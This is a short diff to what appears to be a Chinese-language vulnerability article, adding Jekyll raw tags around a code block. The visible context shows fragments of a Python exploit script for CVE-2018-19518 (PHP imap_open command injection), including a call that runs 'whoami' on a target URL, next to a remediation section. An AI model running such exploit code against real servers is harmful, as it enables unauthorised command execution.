@@ -700,6 +700,7 @@ $stream = imap_open($mailbox, $user, $password);
 
 #### 利用方法
 
+{% raw %}
 ```python
 # CVE-2018-19518利用脚本
 import requests
@@ -736,6 +737,7 @@ if __name__ == "__main__":
     target = "http://target.com/check_mail.php"
     print(exploit(target, "whoami"))
 ```
+{% endraw %}
 
 #### 修复方案
 
